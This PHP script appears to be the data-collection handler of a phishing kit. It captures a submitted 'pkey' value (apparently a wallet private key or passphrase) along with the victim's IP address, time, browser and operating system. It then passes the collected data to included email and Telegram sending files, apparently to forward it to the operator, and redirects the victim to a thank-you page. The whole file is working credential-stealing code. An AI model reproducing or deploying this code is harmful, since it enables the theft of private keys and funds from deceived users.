<?php

session_start();

if(isset($_POST['pkey'])) 
{

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$pkey = $_SESSION['pkey'] = $_POST['pkey'];

$yagmai .= '
[π€ key] = '.$_SESSION['pkey'].'
       [+]ββββγπ» Systemγβββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


include("sand_email.php"); 
include("Add_Your_TelegramAPi.php");

$src="../Thanks.php";
header("location:$src");

}

else {
$src="../Thanks.php";
header("location:$src");
}

?>